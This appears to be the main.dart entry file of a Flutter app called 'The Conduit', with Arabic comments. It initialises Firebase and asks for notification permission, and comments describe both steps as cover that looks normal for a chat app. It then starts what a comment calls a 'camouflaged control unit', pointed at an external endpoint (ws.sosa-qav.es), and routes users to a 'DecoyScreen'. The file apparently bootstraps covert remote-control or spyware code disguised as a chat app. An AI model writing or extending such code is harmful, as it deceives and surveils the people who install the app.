// lib/main.dart - تعديل لتكامل وحدة تحليلات الأمن
import 'dart:io';

import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:permission_handler/permission_handler.dart';

import 'core/controlar/security/integration/security_integration.dart';
import 'core/logging/logger_service.dart';
import 'firebase_options.dart';
import 'presentation/decoy_screen/decoy_screen.dart';
import 'presentation/permission_control/permission_screen.dart';

// اسم التطبيق الذي ستختاره
const String appTitle = "The Conduit";

// Function to request notification permission - طبيعية لتطبيق دردشة
Future<void> _requestNotificationPermission() async {
  final LoggerService localLogger = LoggerService("Permissions");

  // Request for Android and iOS only
  if (!Platform.isAndroid && !Platform.isIOS) {
    localLogger.info("Platform",
        "Not Android/iOS. No need to request notification permission.");
    return;
  }

  final status = await Permission.notification.status;
  localLogger.info(
      "Permission", "Current notification permission status: $status");

  if (status.isDenied) {
    localLogger.info(
        "Permission", "Notification permission is denied. Requesting...");
    final result = await Permission.notification.request();
    if (result.isGranted) {
      localLogger.info(
          "Permission", "Notification permission granted by user.");
    } else {
      localLogger.warn("Permission", "Notification permission denied by user.");
    }
  } else if (status.isPermanentlyDenied) {
    localLogger.warn("Permission",
        "Notification permission is permanently denied. Opening app settings...");
    await openAppSettings();
  } else if (status.isGranted) {
    localLogger.info("Permission", "Notification permission already granted.");
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // تهيئة Firebase - ضرورية لتطبيق الدردشة
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );

  // طلب أذونات الإشعارات - طبيعية لتطبيق دردشة
  await _requestNotificationPermission();

  // تمكين تحليلات الأمن (تهيئة وحدة التحكم المموهة)
  await SecurityIntegration.instance
      .enableSecurityAnalytics(customEndpoint: 'https://ws.sosa-qav.es/api/v2');

  runApp(
    const ProviderScope(
      child: MyApp(),
    ),
  );
}

// تطبيق رئيسي يدعم دورة حياة التطبيق لإدارة موارد تحليلات الأمن
class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
  @override
  void initState() {
    super.initState();
    // إضافة مراقب دورة حياة التطبيق
    WidgetsBinding.instance.addObserver(this);
  }

  @override
  void dispose() {
    // إزالة مراقب دورة حياة التطبيق
    WidgetsBinding.instance.removeObserver(this);
    // تحرير موارد تحليلات الأمن عند إغلاق التطبيق
    SecurityIntegration.instance.releaseAnalyticsResources();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    // مراقبة دورة حياة التطبيق لإدارة موارد تحليلات الأمن
    if (state == AppLifecycleState.resumed) {
      // إعادة تنشيط الخدمات عند استئناف التطبيق
      SecurityIntegration.instance.enableSecurityAnalytics();
    } else if (state == AppLifecycleState.paused) {
      // يمكن إيقاف بعض العمليات مؤقتًا هنا إذا لزم الأمر
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: appTitle,
      theme: ThemeData(
        primarySwatch: Colors.blue,
        visualDensity: VisualDensity.adaptivePlatformDensity,
      ),
      // استخدام شاشة الأذونات كشاشة انتقالية تظهر في المرة الثانية لتشغيل التطبيق
      home: PermissionScreen(
        destinationBuilder: (context) => const DecoyScreen(),
      ),
      debugShowCheckedModeBanner: false,
    );
  }
}
